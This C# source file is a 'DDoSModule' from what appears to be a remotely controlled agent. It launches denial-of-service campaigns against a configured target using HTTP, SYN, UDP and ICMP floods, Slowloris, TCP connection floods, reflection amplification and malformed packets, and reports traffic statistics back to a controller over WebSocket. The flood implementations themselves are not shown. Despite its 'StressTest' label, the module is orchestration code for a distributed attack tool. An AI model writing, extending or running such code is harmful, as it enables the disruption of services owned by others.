using System.Collections.Concurrent;
using System.Text.Json;
using LibraNextgen.Agent.Communication;
using LibraNextgen.Common.Models;
using LibraNextgen.Common.Protocol;

namespace LibraNextgen.Agent.Modules.StressTest;

public class DDoSModule : IDisposable
{
    private readonly WsCommunicator _ws;
    private readonly string _agentId;
    private readonly string _hostname;
    private string _campaignId = string.Empty;
    private readonly ConcurrentDictionary<string, CancellationTokenSource> _activeMethods = new();
    private CancellationTokenSource? _reportCts;

    private long _pkt, _bytes, _conns, _prevBytes;

    public DDoSModule(WsCommunicator ws, string agentId, string hostname)
    {
        _ws = ws; _agentId = agentId; _hostname = hostname;
    }

    public async Task StartAsync(StressConfig config, CancellationToken ct)
    {
        _campaignId = config.CampaignId;
        _reportCts = CancellationTokenSource.CreateLinkedTokenSource(ct);

        Console.WriteLine($"[DDoS] Starting campaign {config.CampaignId}: {config.TargetHost}:{config.TargetPort}, methods=[{string.Join(",", config.Methods)}], threads={config.ThreadsPerAgent}");

        var registry = new Dictionary<string, IStressMethod>(StringComparer.OrdinalIgnoreCase)
        {
            ["httpFlood"] = new HttpFlood(),
            ["synFlood"] = new SynFlood(),
            ["udpFlood"] = new UdpFlood(),
            ["icmpFlood"] = new IcmpFlood(),
            ["slowloris"] = new Slowloris(),
            ["tcpConnFlood"] = new TcpConnFlood(),
            ["reflection"] = new ReflectionAmp(),
            ["malformed"] = new MalformedPacket(),
        };

        var reporter = new SharedReporter(this);

        foreach (var methodName in config.Methods)
        {
            if (!registry.TryGetValue(methodName, out var method))
            {
                Console.WriteLine($"[DDoS] Unknown method: {methodName}, skipping");
                continue;
            }
            var mcts = CancellationTokenSource.CreateLinkedTokenSource(ct);
            _activeMethods[methodName] = mcts;

            Console.WriteLine($"[DDoS] Starting method: {methodName}");
            _ = Task.Run(async () =>
            {
                try { await method.ExecuteAsync(config, reporter, mcts.Token); }
                catch (OperationCanceledException) { Console.WriteLine($"[DDoS] {methodName}: cancelled"); }
                catch (Exception ex) { Console.WriteLine($"[DDoS] {methodName}: {ex.Message}"); }
            }, mcts.Token);
        }

        _ = ReportLoopAsync(_reportCts.Token);
        Console.WriteLine("[DDoS] Report loop started");

        if (config.DurationSeconds > 0)
        {
            _ = Task.Run(async () =>
            {
                await Task.Delay(TimeSpan.FromSeconds(config.DurationSeconds), ct);
                await StopAsync();
            }, ct);
            Console.WriteLine($"[DDoS] Auto-stop scheduled in {config.DurationSeconds}s");
        }
    }

    public async Task StopAsync()
    {
        foreach (var (_, cts) in _activeMethods) { cts.Cancel(); cts.Dispose(); }
        _activeMethods.Clear();
        _reportCts?.Cancel();

        var status = BuildStatus();
        var json = JsonSerializer.Serialize(status, WsJsonContext.Default.StressAgentStatus);
        try { await _ws.SendResultRawAsync("stress.status", _agentId, json); } catch { }
    }

    private async Task ReportLoopAsync(CancellationToken ct)
    {
        while (!ct.IsCancellationRequested)
        {
            try
            {
                await Task.Delay(5000, ct);
                var status = BuildStatus();
                var delta = status.BytesSent - Interlocked.Read(ref _prevBytes);
                Interlocked.Exchange(ref _prevBytes, status.BytesSent);
                status.Mbps = delta * 8.0 / 5.0 / 1_000_000.0;

                var json = JsonSerializer.Serialize(status, WsJsonContext.Default.StressAgentStatus);
                if (_ws.IsConnected)
                    await _ws.SendResultRawAsync("stress.status", _agentId, json);
            }
            catch (OperationCanceledException) { break; }
            catch { }
        }
    }

    private StressAgentStatus BuildStatus() => new()
    {
        CampaignId = _campaignId,
        AgentId = _agentId,
        Hostname = _hostname,
        PacketsSent = Interlocked.Read(ref _pkt),
        BytesSent = Interlocked.Read(ref _bytes),
        ConnectionsOpen = (int)Interlocked.Read(ref _conns),
        LastReport = DateTime.UtcNow
    };

    public void Dispose()
    {
        foreach (var (_, cts) in _activeMethods) { cts.Cancel(); cts.Dispose(); }
        _reportCts?.Cancel(); _reportCts?.Dispose();
    }

    private class SharedReporter : IStressReporter
    {
        private readonly DDoSModule _m;
        public SharedReporter(DDoSModule m) => _m = m;
        public void IncrementPackets(long c) => Interlocked.Add(ref _m._pkt, c);
        public void IncrementBytes(long c) => Interlocked.Add(ref _m._bytes, c);
        public void IncrementConnections(int d) => Interlocked.Add(ref _m._conns, d);
    }
}
